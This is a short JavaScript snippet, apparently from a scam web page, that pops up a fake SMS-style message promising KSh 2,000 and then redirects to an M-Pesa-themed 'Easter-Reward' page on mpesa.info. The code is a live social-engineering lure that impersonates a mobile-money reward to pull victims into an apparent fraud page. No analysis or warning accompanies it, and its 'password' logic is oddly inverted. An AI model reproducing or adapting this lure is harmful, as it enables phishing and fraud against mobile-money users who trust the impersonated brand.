var password = 'WITHDRAW CASH'
password = prompt(
  'SMS: Congratulations! You are eligible to receive KSh 2,000. Please press OK to WITHDRAW.',
  'WITHDRAW CASH'
);
if (password != 'WITHDRAW CASH') {
  location.href = 'https://mpesa.info/Easter-Reward.html';
}
